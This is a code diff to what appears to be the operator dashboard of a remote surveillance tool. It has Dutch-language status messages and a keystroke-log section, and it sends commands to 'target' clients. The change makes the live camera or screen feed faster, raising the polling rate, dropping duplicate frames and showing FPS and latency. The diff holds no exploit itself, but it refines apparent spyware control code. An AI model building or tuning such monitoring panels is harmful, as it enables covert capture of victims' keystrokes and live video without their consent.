@@ -150,7 +150,7 @@ body{font-family:'Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(
 .cam-card .cam-controls button.active{background:#e6f4ea;border-color:var(--online);color:var(--online)}
 .cam-card .live-indicator{display:inline-flex;align-items:center;gap:4px;font-size:.56rem;color:var(--accent);font-weight:700;text-transform:uppercase;letter-spacing:1px}
 .cam-card .live-indicator .live-dot{width:5px;height:5px;border-radius:50%;background:var(--accent);animation:pulse 1s infinite}
-.cam-card .cam-fps{font-size:.52rem;color:var(--dim);font-family:'Consolas',monospace}
+.cam-card .cam-fps{font-size:.58rem;color:var(--green);font-family:'Consolas',monospace;font-weight:600}
 
 /* KEYSTROKE LOG */
 .key-entry{padding:10px 14px;border-bottom:1px solid var(--border)}
@@ -1338,7 +1338,7 @@ function startLiveFeed(clientId) {
         body: JSON.stringify({ target: clientId, type: 'start-live-http', data: {} })
     }).catch(() => {});
 
-    liveFeeds[clientId] = { active: true, lastFrame: Date.now(), pollInterval: null };
+    liveFeeds[clientId] = { active: true, lastFrame: Date.now(), lastSeenTs: 0, pollInterval: null };
 
     const ind = $(`#live-ind-${clientId}`);
     if (ind) ind.style.display = 'inline-flex';
@@ -1347,22 +1347,28 @@ function startLiveFeed(clientId) {
     $('#live-status').textContent = `Verbinding maken met ${clientId}...`;
     $('#live-status').style.color = 'var(--yellow)';
 
-    // Poll for new frames every 200ms
+    let missCount = 0; // consecutive frames with no update
+
+    // Poll for new frames every 80ms (~12 FPS ceiling on admin side)
     liveFeeds[clientId].pollInterval = setInterval(async () => {
         if (!liveFeeds[clientId]) return;
         try {
             const d = await api(`/api/live-frame/${clientId}`);
-            if (!d || !d.frame) return;
+            if (!d || !d.frame) { missCount++; return; }
 
-            liveFeeds[clientId].lastFrame = d.timestamp || Date.now();
+            // Deduplicate: skip if same frame as last render
+            const frameTs = d.timestamp || 0;
+            if (frameTs === liveFeeds[clientId].lastSeenTs) return;
+            liveFeeds[clientId].lastSeenTs = frameTs;
+            liveFeeds[clientId].lastFrame  = frameTs;
+            missCount = 0;
 
             // Update FPS counter
             if (!liveFpsCounters[clientId]) liveFpsCounters[clientId] = [];
             liveFpsCounters[clientId].push(Date.now());
-            const cutoff = Date.now() - 2000;
-            liveFpsCounters[clientId] = liveFpsCounters[clientId].filter(t => t > cutoff);
+            liveFpsCounters[clientId] = liveFpsCounters[clientId].filter(t => t > Date.now() - 2000);
 
-            // Update image
+            // Update image — set src directly (fastest, browser handles decode async)
             const img = $(`#cam-img-${clientId}`);
             if (img) {
                 img.src = d.frame;
@@ -1371,22 +1377,25 @@ function startLiveFeed(clientId) {
                 if (noimg) noimg.style.display = 'none';
             }
 
-            // Update timestamp
-            const timeEl = $(`#cam-time-${clientId}`);
-            if (timeEl) timeEl.textContent = new Date(liveFeeds[clientId].lastFrame).toLocaleTimeString([], {hour:'2-digit',minute:'2-digit',second:'2-digit'});
+            // Latency = now - frame capture timestamp
+            const latencyMs = Date.now() - frameTs;
 
-            // Update FPS display
+            // Update FPS + latency display
             const fpsEl = $(`#cam-fps-${clientId}`);
             if (fpsEl) {
                 const fps = Math.round(liveFpsCounters[clientId].length / 2);
-                fpsEl.textContent = fps + ' FPS';
+                fpsEl.textContent = `${fps} FPS · ${latencyMs}ms`;
             }
+
+            // Update timestamp
+            const timeEl = $(`#cam-time-${clientId}`);
+            if (timeEl) timeEl.textContent = new Date(frameTs).toLocaleTimeString([], {hour:'2-digit',minute:'2-digit',second:'2-digit'});
 
             // Update status once frames arrive
             $('#live-status').textContent = `Live van ${clientId}`;
             $('#live-status').style.color = 'var(--green)';
         } catch {}
-    }, 200);
+    }, 80);
 }
 
 function stopLiveFeed(clientId) {
